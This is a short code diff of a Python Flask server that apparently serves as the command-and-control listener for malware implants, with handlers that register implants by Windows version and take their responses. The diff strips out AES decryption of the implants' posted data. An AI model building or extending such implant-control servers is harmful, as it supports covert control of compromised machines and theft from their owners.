@@ -75,11 +75,8 @@ def under_construction():
 def implant_register():
     #try:
     # Read in Base64 post data
-    aes_data = request.get_data()
+    data = request.get_data().decode()
 
-    # Decrypt it
-    data = AES_INSTANCE.decrypt(aes_data)
-    
     # Extract the major windows version and the build number
     major_v = data.split(":::")[0]
     build_num = data.split(":::")[1]
@@ -153,14 +150,7 @@ def implant_download(FILE_ID):
 def implant_response():
 
     # Read in Base64 post data
-    aes_data = request.get_data()
-
-    # Decrypt it
-    data = ""
-    try:
-        data = AES_INSTANCE.decrypt(aes_data)
-    except:
-        print("There was an error decrypting the message from an implant trying to log in. Please make sure the payload was generated with the same key as the listener")
+    data = request.get_data()
 
     implant_name = request.headers["Cookie"]
     # If not signed in, do nothing, return
